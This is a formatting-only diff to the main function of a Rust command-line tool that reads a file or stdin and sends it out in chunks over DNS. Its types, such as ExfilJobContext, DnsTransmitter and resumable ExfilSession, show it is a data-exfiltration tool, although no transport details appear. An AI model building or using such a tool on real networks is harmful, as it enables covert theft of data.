@@ -41,8 +41,7 @@ fn main() -> Result<()> {
     let mut buffer = Vec::new();
 
     if let Some(path) = args.file.as_deref() {
-        let mut file = File::open(path)
-            .with_context(|| format!("failed to open {:?}", path))?;
+        let mut file = File::open(path).with_context(|| format!("failed to open {:?}", path))?;
         file.read_to_end(&mut buffer)
             .with_context(|| format!("failed to read {:?}", path))?;
     } else {
@@ -59,7 +58,8 @@ fn main() -> Result<()> {
     let mut transmitter = DnsTransmitter::new(cfg.clone(), resolver_pool);
     let scheduler = ChunkScheduler::new(cfg.clone());
 
-    let job = ExfilJobContext::from_source(&buffer, args.file.as_deref(), &args.note, cfg.chunk_bytes);
+    let job =
+        ExfilJobContext::from_source(&buffer, args.file.as_deref(), &args.note, cfg.chunk_bytes);
     let mut session = if let Some(session_hex) = args.session {
         ExfilSession::resume(&job, session_hex)?
     } else {
@@ -78,8 +78,7 @@ fn main() -> Result<()> {
     let elapsed = start.elapsed();
     println!(
         "[+] Transfer completed in {:.1?} ({} chunks)",
-        elapsed,
-        session.job.total_chunks
+        elapsed, session.job.total_chunks
     );
 
     Ok(())
